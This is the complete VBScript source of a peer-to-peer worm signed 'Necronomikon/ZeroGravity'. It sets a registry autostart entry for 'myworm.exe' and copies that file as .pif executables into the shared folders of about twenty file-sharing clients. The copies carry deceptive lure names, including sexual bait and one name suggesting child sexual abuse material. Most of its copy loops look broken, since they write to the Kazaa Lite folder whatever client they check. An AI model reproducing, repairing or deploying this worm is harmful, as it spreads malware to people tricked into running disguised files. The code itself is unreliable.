rem NWWF.P2P-Worm
rem (c)by Necronomikon/ZeroGravity
On error Resume Next
set shell = createobject("wscript.shell")
set fso = createobject("scripting.filesystemobject")
necfilez = fso.getspecialfolder(0) & "\myworm.exe" 
shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\WinBoot32",fso.getspecialfolder(0)& "\myworm.exe"
Pgdir = shell.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if day(now()) = Month and month(now()) = Day then
 msgbox "(c)by Necronomikon/ZeroGravity", vbPicture,"P2P.part of NWWF"
end if
files = array("AIM Password Stealer.exe","Hot Girl.jpg","Pussy.jpg","preteensex.avi","big boobs.jpg","nuke afghanistan game.exe","School Reports.doc","Sex Tips.doc","Lord of the rings.doc","nec is back.doc","Eminem - I need to be shot.mp3","BitchSuck.avi")
kl = (Pgdir & "\kazaa lite\my shared folder") & "\"
if fso.folderexists(kl) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if
kazaa = (Pgdir & "\kazaa\my shared folder") & "\"
if fso.folderexists(kazaa) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if
kmd = (Pgdir & "\kmd\my shared folder") & "\"
if fso.folderexists(kmd) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if
grokster = (Pgdir & "\grokster\my grokster") & "\"
if fso.folderexists(grokster) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if
bearshare = (Pgdir & "\bearshare\shared") & "\"
if fso.folderexists(bearshare) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if
edonkey = (Pgdir & "\edonkey2000\incoming") & "\"
if fso.folderexists(edonkey) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if
morpheus = (Pgdir & "\morpheus\my shared folder") & "\"
if fso.folderexists(morpheus) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if
limewire = (Pgdir & "\limewire\shared") & "\"
if fso.folderexists(limewire) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if

Tesla = (Pgdir & "\Tesla\Files") & "\"
if fso.folderexists(Tesla) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if

XoloX = (Pgdir & "\XoloX\Downloads") & "\"
if fso.folderexists(XoloX) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if

Shareaza = (Pgdir & "\Shareaza\downloads\") & "\"
if fso.folderexists(Shareaza) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if

Gnucleus = (Pgdir & "\Gnucleus\downloads") & "\"
if fso.folderexists(Gnucleus) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if

WinMX = (Pgdir & "\WinMX\my shared folder") & "\"
if fso.folderexists(WinMX) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if

Ftopia3 = (Pgdir & "\Ftopia3\Files") & "\"
if fso.folderexists(Ftopia3) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if

Toadnode = (Pgdir & "\Toadnode\share") & "\"
if fso.folderexists(Toadnode) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if

icq = (Pgdir & "\icq\shared files") & "\"
if fso.folderexists(icq) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if

Overnet = (Pgdir & "\Overnet\Incoming") & "\"
if fso.folderexists(Overnet) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if

Rapigator = (Pgdir & "\Rapigator\Share") & "\"
if fso.folderexists(Rapigator) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if

Apple = (Pgdir & "\AppleJuice\Incoming") & "\"
if fso.folderexists(Apple) then
 for x=0 to 11
  fso.copyfile necfilez,kl & files(x) & ".pif"
 next
end if
